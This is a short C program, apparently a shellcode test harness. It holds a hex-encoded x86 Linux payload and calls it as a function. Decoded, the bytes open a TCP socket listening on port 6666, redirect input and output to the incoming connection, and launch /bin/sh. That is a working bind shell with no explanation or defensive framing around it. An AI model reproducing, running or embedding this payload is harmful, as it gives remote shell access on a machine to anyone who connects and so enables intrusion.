#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x96\xb0\x66\x66\x68\x1a\x0a\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xff\x57\x56\x89\xe1\xcd\x80\xb0\x66\x43\x57\x57\x56\x89\xe1\xcd\x80\x93\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
